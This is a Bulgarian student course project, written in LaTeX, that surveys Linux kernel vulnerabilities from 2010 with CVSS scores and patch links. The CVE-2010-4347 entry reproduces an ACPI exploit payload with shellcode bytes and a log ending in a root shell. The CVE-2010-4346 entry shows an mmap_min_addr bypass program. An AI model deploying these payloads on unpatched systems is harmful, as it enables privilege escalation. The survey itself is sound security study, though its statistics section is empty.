@@ -1,0 +1,526 @@
+\documentclass[a4paper,12pt,leqno]{article}
+\usepackage{extsizes}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[bulgarian]{babel}
+\usepackage{amsmath}
+\usepackage [full]{textcomp}
+\usepackage{graphicx}
+\DeclareGraphicsExtensions{.pdf,.png,.jpg}
+\usepackage[hmargin=3cm,vmargin=2cm]{geometry}
+\usepackage{hyperref}
+
+\title{
+\vspace{0.5cm}
+\begin{Large}
+Курсов проект \\ по \\
+Мрежова сигурност
+\end{Large}
+\vspace{2.0cm}
+\hline
+\vspace{0.5cm}
+\textbf{Анализ на проблемите в сигурността на Linux ядрото в последните 12 месеца}
+\vspace{0.5cm}
+\hline
+\\ \vspace{1.5cm}
+\\ \vspace{1.0cm}\Large{\textit{Изготвили:} \vspace{1.0cm}  \\ Валентина Динкова, ф.н. 71112\\
+ \begin{large}
+< valentinadinkova@yahoo.com >
+\end{large} \\ 
+и \\ Филип Атанасов, ф.н. 71185 \\ \begin{large}
+< philip.atanassov@gmail.com > 
+\end{large} \\ }\vspace{3.0cm}}
+
+\begin{document}
+\maketitle
+\thispagestyle{empty}
+
+\newpage
+
+\tableofcontents
+
+\newpage
+\part{Описание на проблемите в сигурността на Linux ядрото в последните 12 месеца}
+\section{CVE-2010-4347 CVSS Score 6.9}
+\subsection{Описание}
+\paragraph{}
+ACPI подсистемата в Linux ядрата преди 2.6.36.2 използва права за достъп 0222 до файла \textit{custom\_method} на debugfs.
+\begin{verbatim}
+--w--w--w-. 1 root root 0 2010-11-11 14:56 /sys/kernel/debug/acpi/custom_method
+\end{verbatim}
+Това позволява на обикновен потребител, който има достъп до системата да придобие по-високи права, като сложи свой ACPI метод в таблиците за интерпретиране на ACPI. Но за да стане това е необходимо debugfs да е монтирана някъде в ситемата, така че потребителят да има достъп до файла \textit{custom\_method}. По подразбиране debugfs не се монтира. Необходимо е да се изпълни командата
+\begin{verbatim}
+mount -t debugfs nodev /sys/kernel/debug
+\end{verbatim}
+като root.
+Проблемът е оправен на 2010-11-13\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ed3aada1bf34c5a9e98af167f125f8a740fc726a}}.
+\subsection{Exploit}
+\paragraph{}
+Публикация за exploit излиза на 2010-12-18. Автор е Jon Oberheide\footnote{\url{http://www.exploit-db.com/exploits/15774/}}.
+\paragraph{}
+Той компилира ASL\footnote{ACPI Source Language} код до AML\footnote{ACPI Machine Language}, който презаписва ACPI методa, използван при промяна на статуса на LID устройството (при отваряне и затваряне на капака на лаптоп). Когато методът се извика, той презаписва \textit{OperationRegion} на физическият адрес, където \textit{sys\_futimesat} се намира и презаписва паметта чрез \textit{Store}, като по този начин стига до privilege escalation при извикването на \textit{sys\_futimesat}.
+\begin{verbatim}
+DefinitionBlock ("lid.aml", "SSDT", 2, "", "", 0x00001001) {
+  Method (\_SB.LID._LID, 0, NotSerialized) {
+    OperationRegion (KMEM, SystemMemory, PHYADDR, 0x392)
+    Field(KMEM, AnyAcc, NoLock, Preserve) {
+      HACK, 0x392
+    }
+    Store (Buffer () {
+      0x55, 0x48, 0x89, 0xe5, 0x53, 0x48, 0x83, 0xec,
+      0x08, 0x48, 0xc7, 0xc3, 0x24, 0x24, 0x24, 0x24,
+      0x48, 0xc7, 0xc0, 0x24, 0x24, 0x24, 0x24, 0xbf,
+      0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89,
+      0xc7, 0xff, 0xd3, 0x48, 0xc7, 0xc0, 0xb7, 0xff,
+      0xff, 0xff, 0x48, 0x83, 0xc4, 0x08, 0x5b, 0xc9,
+      0xc3 }, HACK)
+    Return (One)
+  }
+}
+\end{verbatim}
+\paragraph{}
+Този exploit се отнася само за 64-битови ОС и зависи от наличието на LID устройство.
+\begin{verbatim}
+$ gcc american-sign-language.c -o american-sign-language
+$ ./american-sign-language
+[+] resolving required symbols...
+[+] checking for world-writable custom_method...
+[+] checking for an ACPI LID device...
+[+] poisoning ACPI tables via custom_method...
+[+] triggering ACPI payload via LID device...
+[+] triggering exploit via futimesat...
+[+] launching root shell!
+# id
+uid=0(root) gid=0(root) groups=0(root)
+\end{verbatim}
+
+
+\section{CVE-2010-4346 CVSS Score 2.1}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{install\_special\_mapping} в\textit{ mm/mmap.c} в Linux ядрата преди 2.6.37-rc6 не извиква функцията \textit{security\_file\_mmap}, което позволява да се заобиколят зададените \textit{mmap\_min\_addr} ограничения и евентуално да се извърши атака с дереференциране на нулев указател, чрез специално създадена програма на асемблер.
+
+\begin{verbatim}
+$ uname -m
+x86_64
+$ cat /proc/sys/vm/mmap_min_addr
+65536
+$ cat install_special_mapping.s
+section .bss
+    resb BSS_SIZE
+section .text
+    global _start
+    _start:
+        mov     eax, __NR_pause
+        int     0x80
+$ nasm -D__NR_pause=29 -DBSS_SIZE=0xfffed000 -f elf
+       -o install_special_mapping.o install_special_mapping.s
+$ ld -m elf_i386 -Ttext=0x10000 -Tbss=0x11000 
+       -o install_special_mapping install_special_mapping.o
+$ ./install_special_mapping &
+[1] 14303
+$ cat /proc/14303/maps
+0000f000-00010000 r-xp 00000000 00:00 0       [vdso]
+00010000-00011000 r-xp 00001000 00:19 2453665 /home/taviso/install_special_mapping
+00011000-ffffe000 rwxp 00000000 00:00 0       [stack]
+
+\end{verbatim}
+\paragraph{}
+Проблемът е оправен на 2010-12-15. \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=462e635e5b73ba9a4c03913b77138cd57ce4b050}}
+
+
+\section{CVE-2010-3881 CVSS Score 1.9}
+\subsection{Описание}
+\paragraph{}
+arch/x86/kvm/x86.c в Linux ядрата преди 2.3.36.2 не инициализира някои членове на структурите \textit{kvm\_vcpu\_events}, \textit{kvm\_debugregs}, \textit{kvm\_pit\_state2} и \textit{kvm\_clock\_data}, което позволява обикновен потребител евентуално да получи важна информация от стека на паметта на ядрото чрез операции за четене върху /dev/kvm устройството\footnote{KVM - Kernel-based Virtual Machine - пълно решение за виртуализация на Linux за x86 хардуер. Съдържа разширение - Intel VT или AMD-V. Състои се от модул към ядрото \textit{kvm.ko} и специфични за процесора разширения \textit{kv-intel.ko} и \textit{kvm-amd.ko}}.
+\paragraph{}
+Проблемът е оправен на 2010-11-01\footnote{\url{http://git.kernel.org/?p=virt/kvm/kvm.git;a=commit;h=831d9d02f9522e739825a51a11e3bc5aa531a905}}.
+
+
+
+%==============================================%==============================================
+
+
+\section{CVE-2010-3880 CVSS Score 4.9}
+\subsection{Описание}
+\paragraph{}
+Във файла \textit{net/ipv4/inet\_diag.c} във версиите на ядрото преди 2.6.37-rc2 байткодът на \textit{INET\_DIAG} не се проверява достатъчно добре,
+което позволява на локален потребител да предизвика \textit{DoS} атака чрез специално създадени инструкции, които съдържат
+повече от един атрибут. Може да бъде предизвикан безкраен цикъл в ядрото.
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от: преди 2005г.
+    \item Добива публичност: 3.11.2010г. \footnote{\url{http://www.spinics.net/lists/netdev/msg145899.html}}
+    \item Оправен: 4.11.2010г. \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=22e76c849d505d87c5ecf3d3e6742a65f0ff4860}}
+\end{itemize}
+
+\section{CVE-2010-4157 CVSS Score 6.0}
+\subsection{Описание}
+\paragraph{}
+Във \textit{drivers/scsi/gdth.c}
+\textit{gdth\_ioctl\_alloc()} приема аргумент \textit{size} като тип \textit{int}.
+\textit{copy\_from\_user()} приема аргумента \textit{size} като тип \textit{unsigned long}.
+\textit{gen.data\_len} and \textit{gen.sense\_len} са от тип \textit{unsigned long}.
+На 64-битова ОС \textit{long} са 64-битови, а \textit{int} са 32-битови.
+Възможно е да се подаде много голямо число и заделянето ще отреже размера до 32 бита
+и ще задели малък буфер. След това, когато извикаме \textit{copy\_from\_user()},
+това ще предизвика неправилно писане в паметта, защото е заделена по-малко памет,
+отколкото се опитваме да запишем.
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от: преди 2005г.
+  	\item Добива публичност: 8.10.2010г. \footnote{\url{http://ns3.spinics.net/lists/linux-scsi/msg47361.html}}
+    \item Оправен: 25.10.2010г. \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=f63ae56e4e97fb12053590e41a4fa59e7daa74a4}}
+\end{itemize}
+
+
+%==============================================%==============================================
+
+
+
+\section{CVE-2010-3904 CVSS Score 7.2}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{rds\_page\_copy\_user} от  \textit{net/rds/page.c} в имплементацията на протокола Reliable Datagram Sockets (RDS) в Linux ядрата преди 2.6.36 не валидира правилно адресите, получени от user space, което позволява на обикновен потребител да получи по-високи привилегии, използвайки системните извиквания \textit{sendmsg} и \textit{recvmsg}.\\
+\paragraph{}
+Проблемът е оправен на 2010-10-15\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=799c10559d60f159ab2232203f222f18fa3c4a5f}}.
+
+\section{CVE-2010-3066 CVSS Score 4.9}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{io\_submit\_one} от fs/aio.c в Linux ядрата преди 2.6.23 позволява на обикновен потребител да причини DoS (дереференциране на нулев указател) чрез системното извикване \textit{io\_submit} с IOCB\_FLAG\_RESFD флаг.
+\paragraph{}
+Проблемът е оправен на 2007-10-08\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=799c10559d60f159ab2232203f222f18fa3c4a5f}}.
+
+\section{CVE-2010-2962 CVSS Score 7.2}
+\subsection{Описание}
+\paragraph{}
+\textit{drivers/gpu/drm/i915/i915\_gem.c} от Graphics Execution Manager (GEM) при драйвера Intel i915 в Direct Rendering Manager (DRM) подсистемата в Linux ядрата преди 2.6.36 не валидира правилно указателите към блокове памет, което позволява на обикновен потребител да пише в паметта на ядрото. Това от своя страна може да доведе до придобиване на по-високи права, чрез използването на интерфейса \textit{ioctl}, свързан с операциите \textit{pwrite} и \textit{pread}.
+
+\begin{itemize}
+    \item Тип: \textit{privileges escalation}
+    \item Съществува от:
+  	\item Добива публичност: 2010-10-03
+    \item Оправен: 2010-09-26 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ce9d419dbecc292cc3e06e8b1d6d123d3fa813a4}}
+\end{itemize}
+
+
+\section{CVE-2010-3705 CVSS Score 8.3}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{sctp\_auth\_asoc\_get\_hmac} в\textit{ net/sctp/auth.c} в Linux ядрата преди 2.6.36 не валидира правилно масивът \textit{hmac\_ids} от SCTP peer, което позволява отдалечени атаки да причинят DoS, чрез поставяне на определена стойност за последен елемент на масива.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-10-01\footnote{\url{http://marc.info/?l=linux-kernel&m=128596992418814&w=2	}}
+    \item Оправен: 2010-10-01 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/davem/net-2.6.git;a=commit;h=51e97a12bef19b7e43199fc153cf9bd5f2140362}}
+\end{itemize}
+
+
+\section{CVE-2010-2963 CVSS Score 6.2}
+\subsection{Описание}
+\paragraph{}
+\textit{drivers/media/video/v4l2-compat-ioctl32.c} в Video4Linux (V4L) имплементацията в Linux ядрата преди 2.6.36, при 64-битовите платформи не проверява мястото, където се копира паметта, което позволява на обикновен потребител да пише в пространството на паметта на ядрото. Това може да доведе до придобиване на по-високи права, чрез извикването на VIDIOCSTUNER ioctl върху \textit{/dev/video} устройството, последвано от VIDIOCSMICROCODE ioctl извикване.
+
+\begin{itemize}
+    \item Тип: \textit{privileges escalation}
+    \item Съществува от:
+  	\item Добива публичност: 2010-10-15
+    \item Оправен: 2010-10-15 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=3e645d6b485446c54c6745c5e2cf5c528fe4deec}}
+\end{itemize}
+
+
+
+\section{CVE-2010-3698 CVSS Score 4.6}
+\subsection{Описание}
+\paragraph{}
+KVM имплементацията в Linux ядрата преди 2.6.36 не презарежда правилно сегментните регистри FS и GS, което позоволява на потребителите на приемната (host) ОС да предизвикат DoS (забиване на приемната ОС), чрез KVM\_RUN ioctl извикване, заедно с промяна на Local Descriptor Table (LDT).
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-10-19
+    \item Оправен: 2010-10-19 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=9581d442b9058d3699b4be568b6e5eae38a41493}}
+\end{itemize}
+
+
+\section{CVE-2010-4249 CVSS Score 4.9}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{wait\_for\_unix\_gc} в \textit{net/unix/garbage.c} в Linux ядрата преди 2.6.37-rc3-след-20101125 неправилно избират времето за garbage collection на inflight сокети, което позволява обикновен потребител да причини denial of service (зависване на системата), чрез използването на системните извиквания \textit{socketpair} и \textit{sendmsg} за сокети SOCK\_SEQPACKET.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-23\footnote{\url{https://lkml.org/lkml/2010/11/23/395}}
+    \item Оправен: 2010-09-24 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/davem/net-2.6.git;a=commit;h=9915672d41273f5b77f1b3c29b391ffb7732b84b}}
+\end{itemize}
+
+\subsection{Exploit}
+\paragraph{}
+Exploit излиза на 2010-09-25\footnote{\url{http://www.exploit-db.com/exploits/15622/}}. Автор е Key Night.
+
+\section{CVE-2010-3858 CVSS Score 4.9}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{setup\_arg\_pages} в \textit{fs/exec.c} в Linux ядрата преди 2.6.36, при използване на CONFIG\_STACK\_GROWSDOWN не ограничава правилно консумацията на паметта на стека на (1) аргументите и (2) средата за 32-битови приложения върху 64-битова платформа, което позволява обикновен потребител да причини DoS (забиване на системата), чрез exec системно извикване.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-08
+    \item Оправен: 2010-09-10 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=1b528181b2ffa14721fb28ad1bd539fe1732c583}}
+\end{itemize}
+
+\subsection{Exploit}
+\paragraph{}
+Exploit излиза на 2010-11-26\footnote{\url{http://www.exploit-db.com/exploits/15619/}}. Автор е Roland McGrath.
+
+
+\section{CVE-2010-4248 CVSS Score 4.7}
+\subsection{Описание}
+\paragraph{}
+В \textit{\_\_exit\_signal} функцията в kernel/exit.c в Linux ядрата преди  2.6.37-rc2 съществува условие на съзтезание, което позволява обикновен потребител да причини DoS, чрез вектори, свързани с \textit{multithreaded exec}, употребата на лидер на група от нишки в \textit{kernel/posix-cpu-timers.c} и избора на нов лидер на група от нишки във функцията \textit{de\_thread} в \textit{fs/exec.c}.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-11-05
+    \item Оправен: 2010-11-05 \footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=e0a70217107e6f9844628120412cb27bb4cea194}}
+\end{itemize}
+
+%==============================================%==============================================
+\section{CVE-2010-3432 CVSS Score 7.8} % (fold)
+\label{sec:CVE-2010-3432 Score 7.8}
+\subsection{Описание}
+Функцията \textit{sctp\_packet\_config} в \texit{net/sctp/output.c} в ядрата преди 2.6.35.6 инициализира по
+грешен начин структурите от данни, представляващи пакети. Това позволява отдалечена атака, предизвикваща DoS чрез определена последователност от \texit{SCTP} трафик.
+
+\textit{sctp\_outq\_flush()} в \textit{net/sctp/outqueue.c}
+може да извика \textit{sctp\_packet\_reset} върху
+структура, представяща пакет, която вече е запълнена с парчета данни.
+\textit{sctp\_packet\_reset()} няма да се погрижи парчетата данни
+и ще промени само дължината. Дължината ще е грешна и това ще предизвика
+``\textit{panic}'' в ядрото, когато се извика функцията \textit{skb\_put} с
+прекалено малко заделена памет, както се вижда и от коментарът над тази функция:
+\begin{verbatim}
+    /**
+     *	skb_push - add data to the start of a buffer
+     *	@skb: buffer to use
+     *	@len: amount of data to add
+     *
+     *	This function extends the used data area of the buffer at the buffer
+     *	start. If this would exceed the total buffer headroom the kernel will
+     *	panic. A pointer to the first byte of the extra data is returned.
+     */
+\end{verbatim}
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от: преди 2005г.
+    \item Добива публичност: 2010-09-14\footnote{\url{http://marc.info/?l=linux-kernel&m=128448383501073&w=3}}
+    \item Оправен: 2010-09-17\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=4bdab43323b459900578b200a4b8cf9713ac8fab}}
+\end{itemize}
+
+% section CVE-2010-3432 Score 7.8 (end)
+
+\section{CVE-2010-4165 CVSS Score 4.9} % (fold)
+\label{sec:CVE-2010-4165 CVSS Score 4.9}
+
+Функцията \textit{do\_tcp\_setsockopt} в \textit{net/ipv4/tcp.c} в ядра с версии преди 2.6.37-rc2
+не ограничава правилно \textit{TCP\_MAXSEG} стойностите, което позволява на локален потребител да
+предизвика DoS (OOPS\footnote{Грешка при изпълнението на код в ядрото, която не завършва със забиване на системата, за разлика от ``panic''. Ядрото
+убива виновния процес и извежда съобщение за грешка.})
+чрез извикване на \textit{setsockopt} с твърде малка стойност за \textit{TCP\_MAXSEG}, което води до деление на
+нула или неправилно използване на целочислена променлива без знак.
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от: 2008-09-21\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=f5fff5dc8a7a3f395b0525c02ba92c95d42b7390}}
+    \item Добива публичност: 2010-11-10\footnote{\url{http://www.spinics.net/lists/netdev/msg146405.html}}
+    \item Оправен: 2010-11-11\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=7a1abd08d52fdeddb3e9a5a33f2f15cc6a5674d2}}
+\end{itemize}
+
+% section CVE-2010-4165 CVSS Score 4.9 (end)
+
+
+\section{ CVE-2010-4169 CVSS Score 4.9} % (fold)
+\label{sec: CVE-2010-4169 CVSS Score 4.9}
+
+Използване на памет след освобождаване в \textit{mm/mprotect.c} в ядра преди версия 2.6.37-rc2 позволява
+на локален потребител да предизвика DoS атака чрез вектори, използвайки \textit{mprotect} системното извикване.
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от: 2009-06-08\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=dab5855}}
+    \item Добива публичност: 2010-11-09\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=63bfd7384b119409685a17d5c58f0b56e5dc03dahttp://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=63bfd7384b119409685a17d5c58f0b56e5dc03da}}
+    \item Оправен:  2010-11-09\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=63bfd7384b119409685a17d5c58f0b56e5dc03dahttp://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=63bfd7384b119409685a17d5c58f0b56e5dc03da}}
+\end{itemize}
+
+% section  CVE-2010-4169 CVSS Score 4.9 (end)
+
+
+%==============================================%==============================================
+
+\section{CVE-2010-2938 CVSS Score 4.9}
+\subsection{Описание}
+\paragraph{}
+\textit{arch/x86/hvm/vmx/vmcs.c}  в virtual-machine control structure (VMCS) имплементацията в Linux ядрата преди 2.6.18 на Red Hat Enterprise Linux (RHEL) 5 при Intel платформата без функционалността за Extended Page Tables (EPT), достъпва VMCS полета, без да прави проверка за хадруерна поддръжка за тези полета. Това позволява на обикновен потребител да причини DoS (забиване на ОС) като поиска VMCS dump за напълно виртуализиран Xen guest.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-08-02
+    \item Оправен: 2010-09-29
+\end{itemize}
+
+\section{CVE-2010-3437 CVSS Score 6.6}
+\subsection{Описание}
+\paragraph{}
+Грешка при указването на целочислен тип със знак във функцията \\ \textit{pkt\_find\_dev\_from\_minor} в \textit{drivers/block/pktcdvd.c} в Linux ядрата преди 2.6.36-rc6 позволява на обикновен потребител да получи важна информация от паметта на ядрото или да причини DoS (невалидно дереференциране на указател и забиване на системата) чрез поставяне на стойност на индекс в \\ PKT\_CTRL\_CMD\_STATUS ioctl извикване.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-27
+    \item Оправен: 2010-09-27\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=252a52aa4fa22a668f019e55b3aac3ff71ec1c29}}
+\end{itemize}
+
+\subsection{Exploit}
+\paragraph{}
+Exploit излиза на 2010-09-29\footnote{\url{http://www.exploit-db.com/exploits/15150/}}. Автор е Jon Oberheide.
+
+
+\section{CVE-2010-3442 CVSS Score 4.7}
+\subsection{Описание}
+\paragraph{}
+Няколко препълвания на целочислени променливи във функцията \textit{snd\_ctl\_new} в sound/core/control.c в Linux ядрата преди 2.6.36-rc5-след-20100929 позволяват на обикновен потребител да причини DoS (предизвикване на грешки в динамичната памет).
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-29
+    \item Оправен: 2010-09-29\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/tiwai/sound-2.6.git;a=commit;h=5591bf07225523600450edd9e6ad258bb877b779}}
+\end{itemize}
+
+\section{CVE-2010-2653 CVSS Score 6.9}
+\subsection{Описание}
+\paragraph{}
+В \textit{hvc\_close} функцията в \textit{drivers/char/hvc\_console.c} в Linux ядрата преди 2.6.34 съществува условие на съзтезание, което позволява обикновен потребител да причини DoS или да причини други неизвестни щети, свързани с \textit{hvc\_open} и \textit{hvc\_remove} функциите, като затвори Hypervisor Virtual Console устройството.
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-02-26
+    \item Оправен: 2010-04-08\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=320718ee074acce5ffced6506cb51af1388942aa}}
+\end{itemize}
+
+\section{CVE-2010-3081 CVSS Score 7.2}
+\subsection{Описание}
+\paragraph{}
+В 32-битовия слой на съвместимост при 64-битовите ядра преди 2.6.36-rc4-git2 възниква препълване на целочислен тип при умножение в метода \textit{access\_ok}, който се използва, за да проверява дали дадена памет е в безопасните граници на пространството на потребителя. Benjamin Hawkes успява да накара стек указателя на потребителя да започне да сочи към пространството на ядрото. Проблемът започва при процедура за заделяне на памет, използвана от слоя за съвместимост от \textit{arch/x86/include/asm/compat.h}
+
+\begin{verbatim}
+static inline void __user *compat_alloc_user_space(long len)                    
+{                                                                               
+        struct pt_regs *regs = task_pt_regs(current);                           
+        return (void __user *)regs->sp - len;                                   
+}
+\end{verbatim}
+\paragraph{}
+Както се вижа никъде няма проверка за underflow на стек указателя на потребителското пространство. Ако слоят за съвместимост използва върнатият указател, без да проверява дали сочи към потребителското пространство, може да се появи грешка в паметта на ядрото.
+\paragraph{}
+Benjamin Hawkes открива два случая, в които това може да стане: първият - video4linux iocte, вторият - в слоя IP multicast desktop compat. Вторият вариант има много благо приятни свойства за explit.
+\paragraph{}
+От \textit{compat\_mc\_getsockopt} в \textit{net/compat.c}:
+\begin{verbatim}
+kgf = compat_alloc_user_space(klen+sizeof(*optlen));                            
+                                                                                
+if (!access_ok(VERIFY_READ, gf32, __COMPAT_GF0_SIZE) ||                         
+      __get_user(interface, &gf32->gf_interface) ||                             
+      __get_user(fmode, &gf32->gf_fmode) ||                                     
+      __get_user(numsrc, &gf32->gf_numsrc) ||                                   
+      __put_user(interface, &kgf->gf_interface) ||                              
+      __put_user(fmode, &kgf->gf_fmode) ||                                      
+      __put_user(numsrc, &kgf->gf_numsrc) ||                                    
+      copy_in_user(&kgf->gf_group,&gf32->gf_group,sizeof(kgf->gf_group)))       
+          return -EFAULT;
+\end{verbatim}
+\paragraph{}
+\textit{klen} е неотрицателно 32-битово число, подадено от потребителското пространство, което означава, че \textit{kgf} указателя може да бъде "превъртян"\ , така че да сочи някъде високо в адресното пространство на ядрото. Указателят \textit{gf32} е валиден адрес в потребителското адресно пространаство и съдържанието на структурата е контролирано. Тъй като се използва "nocheck" версията на \textit{put\_user} и не се извършват повече \textit{access\_ok} проверки, фактът, че \textit{kgf} сочи в адресното пространство на ядрото няма значение - контролираните стойности ще бъдат записани в структурата, сочена от \textit{kgf}.
+
+\begin{itemize}
+    \item Тип: \textit{privileges escalation}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-07
+    \item Оправен: 2010-09-14\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=c41d68a513c71e35a14f66d71782d27a79a81ea6}}
+\end{itemize}
+
+\subsection{Exploit}
+\paragraph{}
+Описаното по-горе позволява на атакуващия да запише каквато иска стойност в първите 31 бита от адресното пространство на ядрото. В практиката това е напълно достатъчно за exploit. (2010-09-19)
+
+\section{CVE-2010-3301 CVSS Score 7.2}
+\subsection{Описание}
+\paragraph{}
+Емулацията на функционалността на системното извикване IA32 в\\ \textit{arch/x86/ia32/ia32entry.S} в Linux ядрата преди 2.6.36-rc4-git2 на x86\_64 платформи не допълва с нула регистъра EAX, след като е използван 32-битовия път на изпълнение на \textit{ptrace} системното извикване. Това би могло да позволи на обикновен потребител да придобие по-високи права, като предизвика достъп извън границите на таблицата със ситемни извиквания, използвайки RAX регистъра. Този проблем е бил отстраняван вече веднъж през 2007 година. Тогава за него е имало и exploit. Проблемът отново се появява, тъй като през 2008 година е имало регресия, която премахва EAX презареждането от LOAD\_ARGS32.\footnote{\url{http://sota.gen.nz/compat2/}}
+
+\begin{itemize}
+    \item Тип: \textit{privileges escalation}
+    \item Съществува от:
+  	\item Добива публичност: 2010-09-14
+    \item Оправен: 2010-09-14\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=eefdca043e8391dcd719711716492063030b55ac}}
+\end{itemize}
+
+\section{CVE-2010-2240 CVSS Score 7.2}
+\subsection{Описание}
+\paragraph{}
+Функцията \textit{do\_anonymous\_page} в \textit{mm/memory.c} в Linux ядрата преди 2.6.27.52, 2.6.32.x преди 2.6.32.19, 2.6.34.x преди 2.6.34.4, и 2.6.35.x преди 2.6.35.2 не разделя подходящо статичната от динамичната памет, което позволява на атакуващия да изпълнят код, като го постави в края на последната страница на сегмента със споделената памет.
+
+\begin{itemize}
+    \item Тип: \textit{privileges escalation}
+    \item Съществува от:
+  	\item Добива публичност: 2010-08-13
+    \item Оправен: 2010-08-13\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=320b2b8de12698082609ebbc1a17165727f4c893}}
+\end{itemize}
+
+\section{CVE-2010-2248 CVSS Score 7.8}
+\subsection{Описание}
+\paragraph{}
+fs/cifs/cifssmb.c в CIFS имплементацията в Linux ядрата преди 2.6.34-rc4 позволява отдалечена атака да причини DoS (kernel panic) чрез изпращане на SMB пакет с невалидна CountHigh стойност, както е демонстрирано при OS/2 server. Сървърът записва в \textit{pSMBr->CountHigh} невалидна стойност, дори в случай на нормални операции за записване. Това води до грешно изчисление на "nbyte" и предизвиква бъг в ядрото в \textit{mm/filemap.c}.
+
+
+\begin{itemize}
+    \item Тип: \textit{DoS}
+    \item Съществува от:
+  	\item Добива публичност: 2010-03-31
+    \item Оправен: 2010-04-03\footnote{\url{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6513a81e9325d712f1bfb9a1d7b750134e49ff18}}
+\end{itemize}
+
+
+
+\section{CVE-2010-2521 CVSS Score 10}
+\subsection{Описание}
+\paragraph{}
+Multiple buffer overflows in fs/nfsd/nfs4xdr.c in the XDR implementation in the NFS server in the Linux kernel before 2.6.34-rc6 allow remote attackers to cause a denial of service (panic) or possibly execute arbitrary code via a crafted NFSv4 compound WRITE request, related to the read_buf and nfsd4_decode_compound functions.
+
+
+
+
+
+
+
+
+
+\part{Статистически анализ}
+
+
+
+
+
+
+
+
+
+
+
+\end{document}
